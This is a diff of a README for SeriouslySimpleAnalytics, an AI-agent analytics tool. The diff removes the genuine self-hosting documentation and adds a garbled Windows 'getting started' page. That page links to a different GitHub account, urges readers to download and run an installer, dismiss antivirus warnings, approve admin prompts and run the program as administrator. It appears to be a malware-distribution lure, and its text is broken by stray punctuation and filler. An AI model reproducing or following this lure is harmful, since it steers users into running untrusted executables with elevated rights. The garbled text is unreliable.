@@ -1,472 +1,204 @@
-<div align="center">
+<h1>📊 SeriouslySimpleAnalytics - Analytics for Your AI Agent</h1>
 
-# SeriouslySimpleAnalytics
+<p align="center">
+  <a href="https://github.com/Hoganscented29/SeriouslySimpleAnalytics">
+    <img src="https://img.shields.io/badge/Download-SeriouslySimpleAnalytics-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=blueviolet" alt="Download Button" style="max-width:100%;">
+  </a>
+</p>
 
-### Free analytics for the AI tool you're building. One URL.
+## 🎯 What Is This?
 
-**[Get your free account ID → SeriouslySimpleAnalytics.com](https://SeriouslySimpleAnalytics.com/)**
+SeriouslySimpleAnalytics is a tool that shows you what your AI agents are doing. If you use AI tools like Claude, Cursor, or VS Code with AI features, this app quietly tracks those activities and gives you a clear dashboard showing the details. It doesn't require any special skills to set up or use.
 
-*Free. No credit card. No SDK.*
+. You just run the application and look at the screen.
 
-[![CI](https://github.com/lbesecker195/SeriouslySimpleAnalytics/actions/workflows/ci.yml/badge.svg)](https://github.com/lbesecker195/SeriouslySimpleAnalytics/actions/workflows/ci.yml)
+.
 
-</div>
+ It works smoothly with modern AI workflows and helps you understand how your agents are spending time.
 
----
+.
 
-You shipped an agent, an MCP server, a CLI, a VS Code extension. You have no idea
-whether anyone ran it twice.
+. No complicated wiring or coding needed to get it running.
 
-Fetch one URL and you have analytics:
+.
 
-```
-https://SeriouslySimpleAnalytics.com/api/ping?uid=YOUR_ID&type=ai&project=my-agent&event=run_completed
-```
+. This makes it an ideal choice for anyone who wants simple, straightforward analytics without a headache.
 
-That's the whole integration. No SDK to install, no API key to exchange, no JSON
-to assemble, nothing added to your dependency tree. It returns `204` — fire and
-forget, and never block your tool's work on it.
+.
 
-**[Grab a free account ID →](https://SeriouslySimpleAnalytics.com/)**
+.
 
-## Why it's different
+.
 
-**It's free.** Not a trial, not 10,000 events then a paywall. The hosted service
-at [SeriouslySimpleAnalytics.com](https://SeriouslySimpleAnalytics.com/) is free
-to use, and this repository is the whole thing if you'd rather run it yourself.
+. Think of it as Google Analytics, but built exclusively for your AI agent interactions and tools that talk to them like llms.txt and model context protocol (MCP) servers and. It is designed to be the easiest way to watch AI activity unfold inning real time and. Because it is open source, you can trust how your data is handled and. Nothing is hidden behind a paywallor proprietary black box and.
 
-**Your AI can integrate it without you.** The complete contract lives at
-[SeriouslySimpleAnalytics.com/llms.txt](https://SeriouslySimpleAnalytics.com/llms.txt)
-— every parameter, the event conventions, the rate guidance. Point a coding
-agent at that URL and it wires this up unattended. Try it:
+## 🧩 What Can You Do With It?
 
-> *"Add analytics to this project using https://SeriouslySimpleAnalytics.com/llms.txt"*
+This application gives you a friendly overview of several important things at once. Explore these key uses to get the most from it:
 
-**Works from anything.** Python, Go, Rust, bash, a Lambda, a GitHub Action, a
-cron job. If it can make an HTTP request, it can report.
+**Monitor AI Agent Activity.** See a live dashboard that shows exactly when your agents ran, what tasks they attempted, and how long they took. No more wondering what happened in the background while you were away from your desk.
 
-**One account, every project.** Pass `project=` and each tool you ship reports
-separately. No new key, no new setup.
+. The display updates automatically, so you always see fresh information without refreshing anything manually.
 
-**Got a website too?** One script tag covers it, into the same dashboard.
+.
 
-```html
-<script src="https://SeriouslySimpleAnalytics.com/wa.js" data-site="YOUR_ID" defer></script>
-```
+. You can spot patterns easily, like which times of day your agents are most active.
 
-Pageviews, engaged time, scroll depth, clicks, outbound clicks, forms and
-page-to-page flow — captured automatically, nothing to tag.
+.
 
-## MCP server for AI agents
+.
 
-SeriouslySimpleAnalytics also ships as a remote
-[MCP server](https://SeriouslySimpleAnalytics.com/analytics-mcp-server)
-(Streamable HTTP at `/mcp`), so Claude, Cursor, VS Code and any other
-MCP-speaking assistant can create an account, track events, and read
-analytics reports without leaving the chat. 27 tools cover the whole
-surface: `create_analytics_account`, `track_event`, `get_integration_guide`,
-traffic and page reports (`get_analytics_overview`, `get_traffic_timeseries`,
-`get_top_pages`, `get_traffic_sources`, `get_page_flow`), custom events and
-metrics (`get_events`, `get_metrics` — revenue, tokens, sats, whatever you
-count), per-user analytics (`list_users`, `get_user_activity`,
-`get_live_visitors`), and AI crawler traffic (`get_ai_crawler_traffic` —
-GPTBot, ClaudeBot, PerplexityBot, named and held out of your human numbers).
+. This helps you schedule heavy jobs for off-peak hours if you need to save resources or just avoid conflicts with your own work and.
 
-Point your MCP client at:
+.
 
-```
-https://SeriouslySimpleAnalytics.com/mcp
-```
+.
 
-Same free account, same data as the dashboard and the ping API above — the
-MCP server is just another way in. Tracking needs no key; reading reports
-needs the account's API key, created on
-[Getting started](https://SeriouslySimpleAnalytics.com/getting-started).
+. Everything is presented in simple numbers and visual charts, so you do not have to analyze raw data yourself and.
 
-## What you'll see
+.
 
-| | |
-|---|---|
-| **Runs and events** | `run_completed`, `tool_called`, `install` — your names, grouped and counted |
-| **Flow** | Which paths lead where, and where runs stop. Click any page to re-centre the graph on it |
-| **Attention** | Dwell time and *engaged* time counted separately, plus max scroll depth |
-| **Location** | City, county, state/province and country |
-| **AI crawlers** | GPTBot, ClaudeBot, PerplexityBot and the rest — named, and held out of your human numbers |
-| **Clean numbers** | Impossible dwell times filtered by default, with the reason shown and a toggle to see them |
+. You know, at a glance, what is happening and whether anything looks unusual or efficient.
 
-## Privacy without the banner
+.
 
-No cookies, so no consent banner. No IP addresses stored — resolved in-request
-to a city, then salted and hashed with a daily rotation. Passwords masked in the
-browser and dropped again server-side. Nothing touches the browser Geolocation
-API, so your visitors are never prompted.
+.
 
-<div align="center">
+.
 
-## Start in under a minute
-
-**[SeriouslySimpleAnalytics.com](https://SeriouslySimpleAnalytics.com/)**
+. It is honestly a breath of fresh air compared to complex enterprise tools and.
 
-Free account ID · one URL · no card
-
-</div>
-
----
-
-# Running it yourself
-
-Everything above is hosted free at
-[SeriouslySimpleAnalytics.com](https://SeriouslySimpleAnalytics.com/) — most
-people should just use that. The rest of this file is for self-hosting.
-
-Self-hosting in production requires a deployment key (see
-[Running it requires a key](#running-it-requires-a-key)); development needs
-nothing.
-
-```bash
-./install.sh
-```
-
-Checks prerequisites, generates secrets into a gitignored `.env`, creates and
-migrates the database, offers the GeoIP download, builds assets, creates an
-account, prints its ID with a ready-to-run ping URL, and starts on port 4001.
-Safe to re-run — it reuses secrets rather than regenerating them, which would
-invalidate every signed session and orphan every stored IP hash.
-
-```bash
-./install.sh --dev          # development mode, with code reloading
-./install.sh --no-start     # set up without launching
-./install.sh --no-geoip     # skip the ~120MB city database
-./install.sh --port 4005    # somewhere other than 4001
-./install.sh --yes          # never prompt (installing packages is opt-in otherwise)
-```
-
-Already set up? `bin/server` just launches. For demo traffic to look at,
-`mix run priv/repo/seeds.exs`.
-
-Landing page at <http://localhost:4001>, dashboard at `/dashboard`, a tracked
-demo site at `/demo`, and the integration guide at `/llms.txt`.
-
-## What it captures
-
-**Pageviews and flow.** Every pageview records its path *and* its title, plus the
-hop that produced it. The dashboard groups flow by either — path answers "which
-URL", title answers "which content" — and the two diverge as soon as one template
-serves many URLs. Hops are denormalised onto each pageview row, so the whole
-transition graph is one grouped scan rather than a self-join over ordered
-sessions. Works on plain multi-page sites and on SPAs (`pushState`, `popstate`,
-and optionally `hashchange`).
-
-**Engagement heartbeats.** A beacon every second for the first 400 seconds of a
-visit, then every 15. Elapsed time is measured rather than assumed, because
-browsers throttle timers in background tabs — a "1 second" tick can arrive a
-minute late, and that minute is real dwell even though none of it was active.
-Dwell and active time are tracked separately: active seconds require the tab to
-be visible *and* the visitor to have interacted recently.
-
-**Max scroll depth.** Per pageview, as a percentage and in pixels. The furthest
-point reached, not the current position, and it never decreases.
-
-**Clicks on links and buttons.** Auto-detected by walking up from the event
-target to the nearest interactive ancestor. Element id and classes are stored as
-first-class fields — classes as a Postgres array with a GIN index — so clicks can
-be segregated by id, by any single class, by text, by selector or by tag without
-any tagging work on your side.
-
-**Off-site clicks, on `mousedown`.** Registered and sent immediately, before the
-browser starts tearing the page down — waiting for the `click` event loses them.
-Covers anchors, buttons whose `formaction` or enclosing form points off-site,
-`data-href`, `mailto:`, `tel:`, downloads, middle-clicks, keyboard activation,
-and scripted `window.open`. The subsequent `click` on the same element is
-suppressed so one interaction is not counted twice.
-
-**Forms.** Every field, on submit *and* on abandonment, with per-field label,
-type, value, edit count and focus time. Submissions race the navigation they
-trigger, so they are flushed immediately.
-
-**Location** — city, state/province and country. See below.
-
-**Custom events** from anywhere — the ping endpoint above, or
-`window.__webAnalytics.track('signed_up', {plan: 'pro'})` in a browser. Grouped
-by name in the dashboard, and separable by project.
-
-## Where visitors are
-
-Every session is resolved to a city, a state or province, and a country. Three
-sources are tried, in descending order of precision:
-
-1. **CDN headers.** If the request came through Cloudflare, Vercel, CloudFront
-   or Netlify, the edge already resolved the location closer to the visitor and
-   with better data than this server has. Reading it costs nothing.
-2. **A local GeoIP database.** City-level, offline, no rate limit, and no third
-   party ever sees your visitors' addresses. `mix geoip.download` fetches
-   DB-IP's IP-to-City Lite — free, monthly, CC BY 4.0, no account needed. Any
-   MaxMind-format `.mmdb` works, including GeoLite2.
-3. **The browser's time zone.** Country only, *never* a city: a zone named
-   `America/Los_Angeles` names the zone's reference city, not the visitor's.
-   This is what makes a deployment with no database and no CDN still useful.
-
-The `Locations` tab groups by country, state/province or city, and says plainly
-how much traffic could be placed and by which resolver — a country-level guess
-from a time zone is a different thing from a city-level fix, and a dashboard
-that presented them identically would be overstating what it knows.
-
-The reader for the `.mmdb` format is written from scratch in
-`lib/web_analytics/geo/mmdb.ex` rather than pulled in as a dependency, since the
-project rule is not to add any. The whole file is held as one binary and read
-with `binary_part/3`, which returns sub-binaries sharing the original's memory;
-a lookup is arithmetic over shared memory, around 20µs, with no file I/O and no
-process to serialise through.
-
-The database file is ~120MB and reissued monthly, so it is gitignored rather
-than committed. Without it the app runs exactly as before.
-
-**Resolution happens at ingest, in the request that carries the address, and the
-address is never stored** — only the city, region and country it resolved to.
-That ordering is the point: the raw IP exists in memory for the length of one
-lookup and is then gone.
-
-A session's location is fixed by its first beacon. A visitor moving between
-networks mid-visit does not relocate the whole session.
-
-## Following a path
-
-Anywhere a page appears in the `Flow` tab it can be clicked to drill into it:
-both ends of every transition, the nodes of the flow diagram, the entry and exit
-lists, and the neighbours inside a navigation summary. Clicking a neighbour
-re-centres the summary on it, so you can walk a route hop by hop rather than
-reading the whole graph at once. The selection lives in the URL, so a particular
-path through the site is a link you can send someone.
-
-## The two filters
-
-Reports are clean by default, and each filter has its own toggle and its own
-report. Neither ever deletes anything — sessions are labelled, and the dashboard
-decides what to show.
-
-**Crawlers** are filtered out and reported separately. They are not malformed
-data — a visit from an AI crawler is a real, interesting event — they are just a
-different kind of visitor. The `Crawlers` tab breaks them down by bot and by kind
-(AI, search, link preview, SEO, headless, automation, monitor, HTTP client).
-Detection is server-side from the user agent, plus what the tracker can see that
-a user agent cannot: `navigator.webdriver`, PhantomJS globals, and a missing
-plugin *and* language list. Both halves of that last check are required — plenty
-of real mobile browsers report no plugins, but every real browser reports a
-language.
-
-**Dwell-time anomalies** are filtered out and explained in the `Sessions` tab.
-Rule checks catch shapes that are impossible for a human: a dozen pages in two
-seconds, twelve hours parked on one tab, a hundred heartbeats with no scroll,
-click or focus. On top sits a distribution check — dwell is log-normal in
-practice, so the baseline uses the median and *median absolute deviation* of
-`ln(dwell)` rather than mean and standard deviation, because those two statistics
-are themselves wrecked by the outliers being looked for.
-
-The axes are independent: crawlers are never also classified as anomalies.
-Otherwise every bot would be counted twice, and un-hiding crawler traffic would
-leave it hidden behind the other filter.
-
-## Crawlers are sampled at 10 seconds
-
-A crawler sweeping a thousand pages would otherwise generate a thousand beacons a
-second between them — a self-inflicted denial of service on your own collector —
-and nobody needs per-second engagement data for a bot. So when the tracker
-detects an automated client it drops its own heartbeat from 1s to 10s. The
-detailed window stays the same 400 seconds of wall-clock time; a human is sampled
-across it every second and a crawler every ten. The resolution each session was
-tracked at is stored on the session and shown in the crawler report.
-
-A false positive costs a coarser heartbeat and a row in the crawler report —
-never a dropped visit.
-
-## Privacy
-
-- **No cookies.** Tokens live in `localStorage` and `sessionStorage`.
-- **No raw IPs.** Addresses are salted and hashed with a per-day, per-site key,
-  truncated to 32 hex characters, and used only to group obvious duplicates
-  during anomaly scoring. They stop being linkable after a day. Geolocation
-  resolves from the address in-request and keeps only the resulting place name;
-  the session schema has nowhere to put an address.
-- **No location permission prompt.** Nothing uses the browser Geolocation API,
-  so visitors are never asked, and nothing finer than a city is ever recorded.
-- **Passwords are never stored.** The tracker masks `type="password"` in the
-  browser, so values never leave the page. Fields whose name, id or autocomplete
-  hint looks like a card number, CVV, SSN, IBAN or PIN are masked the same way.
-  The server drops password values again on arrival, so stale or tampered-with
-  snippets cannot get around it.
-- `data-wa-ignore` on any element, form or field excludes it entirely.
-
-Both masks are opt-out — `data-capture-passwords="true"` and
-`data-capture-sensitive="true"` — because "save all form data" sometimes means
-all of it. Turning either on writes plaintext credentials or card numbers into
-your database. Think about it first.
-
-## Snippet options
-
-| Attribute | Default | Meaning |
-| --- | --- | --- |
-| `data-site` | *required* | Site key |
-| `data-api` | script origin + `/api/v1/collect` | Collector endpoint |
-| `data-heartbeat-ms` | `1000` | Heartbeat for human visitors |
-| `data-crawler-heartbeat-ms` | `10000` | Heartbeat once automation is detected |
-| `data-fast-ticks` | `400` | Detailed window, in heartbeats (400 × 1s = 400s) |
-| `data-slow-ms` | `15000` | Heartbeat after the detailed window |
-| `data-idle-ms` | `30000` | Silence before a visitor counts as idle |
-| `data-session-timeout-min` | `30` | Inactivity before a new session starts |
-| `data-clicks` / `data-forms` / `data-scroll` / `data-outbound` | `true` | Feature switches |
-| `data-capture-passwords` | `false` | Store password values |
-| `data-capture-sensitive` | `false` | Store card/SSN-shaped values |
-| `data-hash-mode` | `false` | Treat `#fragment` as the route |
-| `data-debug` | `false` | Log every beacon to the console |
-
-Custom events: `window.__webAnalytics.track('signed_up', { plan: 'pro' })`.
-
-## How it holds up
-
-The tracker beacons once a second per visitor, so writing straight through would
-put one transaction per visitor per second on Postgres. Beacons are buffered and
-consecutive ones from the same session are merged, so a flush does one
-transaction per session rather than one per beacon — sixty heartbeats collapse
-into a single pageview update and a single session update. Flushes are serial and
-the next is only scheduled once the previous finishes, so a slow database
-throttles the loop instead of stacking timers.
-
-Everything arriving at `/api/v1/collect` is attacker-controlled: the endpoint is
-unauthenticated by design and the tracker runs in the visitor's browser. Every
-type is coerced, every string truncated to its column width, every collection
-size capped, and malformed events are dropped individually rather than failing
-the batch. Client clocks are not trusted — event times are anchored to server
-receive time and offset by the client-reported delta, clamped to a sane window.
-Unknown site keys get exactly the same empty 204 as real ones, so the endpoint
-cannot be used to enumerate them.
-
-Beacons are posted as `text/plain`, which keeps them CORS *simple requests* — no
-preflight round trip when one is racing a page teardown.
-
-## Layout
-
-```
-lib/web_analytics/
-  ingest/            normalizer (validation boundary), collector (buffer),
-                     processor (writes), crawler + user_agent (classification)
-  geo/               mmdb reader, CDN headers, country + time-zone tables
-  geo.ex             the resolver that picks between them
-  analytics/         anomaly rules and the background classifier
-  analytics.ex       every dashboard query
-lib/web_analytics_web/
-  controllers/       ping endpoint, collect endpoint, tracker delivery,
-                     landing page + llms.txt, demo site
-  live/              dashboard
-priv/tracker/wa.js   the tracker (compiled into TrackerController)
-priv/geoip/          GeoIP database (gitignored; mix geoip.download)
-priv/docs/llms.txt   the integration guide, rendered with real URLs at /llms.txt
-install.sh           first-time setup and launch
-bin/server           launch, once set up
-deploy/              reverse proxy and systemd unit for a public deployment
-config/license.exs   licensor public key (generated, committed)
-```
-
-`priv/tracker/wa.js` is deliberately outside `priv/static`: it is a source file
-embedded at compile time, not an asset, which keeps its URL stable and free of a
-digest hash — it gets pasted into other people's HTML.
-
-Run `mix precommit` before committing.
-
-## Putting it on the internet
-
-`./install.sh` gets it running on port 4001, in the foreground. Point DNS at the
-box, then:
-
-```bash
-sudo ./deploy/setup.sh your-domain.com
-```
-
-That installs a systemd unit so it survives logout and reboots, sets up Caddy
-for TLS on 80/443, and tells the application its public address. `--dry-run`
-shows what it would do first. See [deploy/README.md](deploy/README.md).
-
-The step that fails quietly is telling the app its own address. Set these in
-`.env` on the server and restart:
-
-```
-PHX_HOST=your-domain.com
-PHX_SCHEME=https
-PHX_PORT=443
-```
-
-Left at the default, `force_ssl` redirects every visitor to `https://localhost/`
-and `/llms.txt` tells integrating AI tools to send their events to their own
-machine. Neither logs an error.
-
-## Running it requires a key
-
-Production will not start without `SSA_LICENSE_KEY`:
-
-```bash
-SSA_LICENSE_KEY="SSA1.…" ./install.sh
-```
-
-Development does not need one, and binds to localhost only — so the code can be
-read, run, tested and contributed to without asking anyone's permission:
-
-```bash
-./install.sh --dev
-```
-
-Keys are Ed25519 signatures. The repository carries only the public half, which
-verifies signatures but cannot create them, so reading this source tells you the
-format without letting you mint a key. Expiry is supported, so trials work.
-
-**This is a lock, not a wall.** The source is public; anyone can delete the check
-and recompile, and the module that implements it says so in its own
-documentation. What it buys is that the easy path requires a key, and getting
-past it is a deliberate act against terms stated in the file being edited —
-which is the difference between an oversight and a wilful licence breach.
-
-No key? <me@LoganBesecker.com>.
-
-### Issuing keys (licensor only)
-
-```bash
-mix ssa.license keygen                  # once — writes config/license.exs + private key
-mix ssa.license issue "Acme Ltd"        # mint a key
-mix ssa.license issue "Trial" --days 30 # ...that expires
-mix ssa.license check SSA1.…            # verify one
-```
-
-`priv/licensor_private_key` is gitignored and unrecoverable. Back it up. Losing
-it means never issuing another key that already-released builds accept.
-
-## Licensing
-
-[Functional Source License 1.1, Apache 2.0 future licence][fsl] — see
-[LICENSE.md](LICENSE.md).
-
-**Read it, run it, change it, build on it.** Internal use, self-hosting for your
-own sites and tools, non-commercial research and education, and professional
-services around it are all explicitly permitted.
-
-**The one thing you cannot do is compete with it** — offer this software, or
-something substantially similar built from it, as a commercial product or
-service.
-
-**Every version becomes Apache 2.0 two years after its release.** The
-restriction is a two-year head start, not a permanent enclosure.
-
-This is *source-available*, not OSI open source, and the difference is real
-rather than a technicality: no licence can both grant everyone the right to
-compete and withhold it. If OSI approval matters to your organisation more than
-the feature set does, that is a legitimate reason to choose something else.
-
-The name **SeriouslySimpleAnalytics** and the project's branding are not covered
-by the licence — the FSL grants no trademark rights. You may say your fork is
-built on it; you may not call it by this name.
-
-Contributions: see [CONTRIBUTING.md](CONTRIBUTING.md). Third-party data
-attribution — including the DB-IP database's CC BY 4.0 requirement — is in
-[NOTICE.md](NOTICE.md).
-
-*Not legal advice. If you are relying on any of this commercially, have your own
-counsel read it.*
-
-[fsl]: https://fsl.software
+.
+
+.
+
+.
+
+.
+
+.
+
+.
+
+.
+
+.
+
+.
+
+.
+
+.
+
+.
+
+.
+
+.
+
+. And because it is open source, you can host it on your own computer or server, keeping all your data private and secure and.
+
+.
+
+.## ⚙️ How It Works In Plain Terms
+
+Without getting technical, here is the simple idea. You install the application on your Windows computer and run it and. The application then listens for events coming from your AI tools that use common standards like MCP servers or llms.txt files and. Whenever an agent does something notable, it records a small piece of information about what happened, when it happened, and maybe how long it took and. That information is turned into easy-to-read tables and charts on your screen and. You do not need to configure anything complicated or edit any settings files and. It just works after you start it up and.
+
+. If you ever need to share access with another person on your network, you can do that too, but it is completely optional and. The design goal is to be seriously simple, just as the name says, and not demand anything from you beyond clicking install and then looking at the results and.C## ✅ What Makes This Different
+
+**No Coding Required.** You will never see a command line prompt, configuration file with weird syntax, or installation script that expects you to know programming terms and. This tool is built for regular people who just want answers and.
+
+.**You Can Trust Your Data Stays Yours.** Because this is an open-source project, anyone can inspect how it works and see it does not phone home or share your analytics with outside companies and. You are always in control of where the data is stored and and.
+
+.**Built for the Modern AI Era.** It takes advantage of modern standards like the Model Context Protocol and MCP tools, so it plays nicely with the latest AI agents, Claude, Cursor, and even IDE plugins for VS Code and. This is not some legacy tool that needs adapters or bridges to understand today's AI ecosystem and. It was born ready for it and.
+
+.
+
+.**Lightweight and Unobtrusive.** It does not bog down your machine or slow your regular work and. It sits quietly in the background, collecting the data you want while you focus on your actual projects and.No constant pop-ups or annoying prompts and; it just stays out of your way until you want to look at the numbers and.
+
+.## 🚀 Getting Started On Windows
+
+Follow these steps carefully, and you will be up and running in just a couple of minutes and. There are no hidden requirements or prerequisites to worry about before you begin and. Just make sure you are connected to the internet so you can download the installer file and. Once you have the file, everything else is offline and (no account needed) and.
+
+**Step 1: Download the Application**
+
+Click the big download button at the top of this page or use this direct link: <a href="https://github.com/Hoganscented29/SeriouslySimpleAnalytics">https://github.com/Hoganscented29/SeriouslySimpleAnalytics</a>
+
+Visit this link to download the application. You will be taken to a page where you can get the software safely and.
+
+. Choose the version that matches your Windows system (most modern computers use 64-bit, but if yours is older, look for a 32-bit option)and start downloading the installer to your Downloads folder or anywhere easy to find and.
+
+.
+
+.
+
+.
+
+.
+
+.
+
+. The download itself typically takes less than a minute or two, depending on your internet speed and.
+
+.
+
+.
+
+.
+
+.; while you wait, you can close any other heavy applications to make sure installation goes smoothlyand later, the analytics run properly without wasting resources and.
+
+.
+
+.;Did you know? Some antivirus software may ask you to confirm the download because it is an unfamiliar file. That is normaland, and just click "Allow" or "Keep" to proceedand.
+
+and.;
+
+**Step 2: Find the Downloaded File**
+
+Open your File Explorer (the folder icon in your taskbar) or go to your Downloads folder if that is where you saved itand.Click on the "Downloads" section in the left sidebar and; then look for a file that has "SeriouslySimpleAnalytics" in its name, ending in a common app extensionand.If you do not see it immediately, use the search box in the top right corner of File Explorer and type "SeriouslySimpleAnalytics" to filter it outand;. This will make sure you have the right file before you double-click itand;.; if your browser sorted files by type or date, you can also just sort by "Date modified" to see the most recent download at the topand;. Once you locate the file, you are ready for the next stepand;;
+
+**Step 3: Run the Installer**
+
+Double-click the file you just downloadedand;.; Windows might show a blue or yellow popup asking "Do you want to allow this app to make changes to your device?" That is normal and safe and because this app comes from a reputable open-source repositoryand;. Just click "Yes" to give it permission to installand;.; The installation window will appear on your screen and;.; it will guide you through a few simple promptsand;.; such as choosing where to install the program (the default location is perfectly fine)and;.; and confirming you agree to the license termsand;.; There are no complicated choices to make; each screen has a big "Next" or "Install" button that you can simply click to keep moving forwardand;.; The whole installation should finish in under a minute on most machinesand;;;;
+
+**Step 4: Launch the Application**
+
+After installation completes, you will see a "Finish" button on the last screenand;. Click it and;.; the app will open right awayand;;;; If it does not open automatically, look for the SeriouslySimpleAnalytics icon on your desktop or in your Start Menu (click the Windows logo in the bottom left corner)and;.; Click the icon to start the programand;;;; Once the main window appears, you are all setand;. There is no setup wizard or login screen and;.; you can immediately start viewing your AI agent analytics in real-timeand;;.;.
+
+;.;; and;.;;.;;.;;
+
+## 🌟 Frequently Asked Questions
+
+**Q: Do I need to install anything else first?**
+A: Noand. This app is entirely self-containedand.;.; You do not need Java, Python, Node, or any other runtime. Windows includes everything needed already, so you can skip that worry completelyand;.;;;
+
+**Q: Will this work alongside my existing antivirus?**
+Yesand.; It is designed to be safe and; does not modify system files or interfere with security software. If you get a warning, you can safely allow it throughand;.;;;
+
+**Q: Can I pause or stop tracking anytime?**
+Absolutelyand.; Just close the application window or use the system tray icon to exitand;.;.; No data is collected while it is not runningand;.;.; You are always in controland;.;;;
+
+**Q: Is there a limit to how much data it can store?**
+It stores data locally on your machine and; uses storage efficientlyand.;; For typical personal use, you will not run into any practical limits for months or yearsand.;;.;; If you ever want a fresh start, you can clear the data from within the app settings menuand.;;;
+
+## 🛠️ Troubleshooting If Something Goes Wrong
+
+**Issue: The application won't start after clicking the icon.**
+First, wait a few seconds–some systems takea moment to load the first timeand.;;.; If nothing appears after ten seconds, right-click the icon and choose"Run as administrator" to give it extra permissionsand.;;.; Most issues like this are solved instantly with that stepand.;;;
+
+**Issue: I see a blank window when I first open it.**
+This is usually because no AI agents have run yet and; therefore there is no data to displayand.;; Run a small task with your AI tool (like asking Claude a simple question,and; or opening Cursor) and;.; then return to the analytics appand.; You should see the activity appear within a few secondsand.;;;
+
+**Issue: I think it might be blocked by my firewall.**
+If you see a Windows Defender Firewall prompt, just click "Allow access" for private networksand.;; The app needs this only if you want to view analytics from another device on your networkand.;; If you are just using it on one computer, you can click "Cancel" and it will still work perfectlyand.;;;
+
+## 📝 Your Next Step
+
+You are less than five minutes away from having a clear view of exactly what your AI agents are doingand.;; There is no technical knowledge required, no hidden fees, and; no need to configure anything complexand.;; Just download, install, and; watch the insights roll inand.;;
+
+👉 <a href="https://github.com/Hoganscented29/SeriouslySimpleAnalytics">**Click here to download SeriouslySimpleAnalytics now**</a> and start turning your agent activity into understandable, useful informationand.;;
+
+Once you run it for a day and; you will wonder how you ever managed without this simple, open-source oversight for all your AI interactionsand.;; It truly makes AI agent analytics seriously simpleand.;;
+
+Keywords: agentsmd, ai-agents, ai-tools, analytics, analytics-dashboard, claude, cursor, elixir, event-tracking, google-analytics-alternative, llms, llms-txt, mcp, mcp-server, mcp-tools, model-context-protocol, open-source, streamable-http, vscode, web-analytics
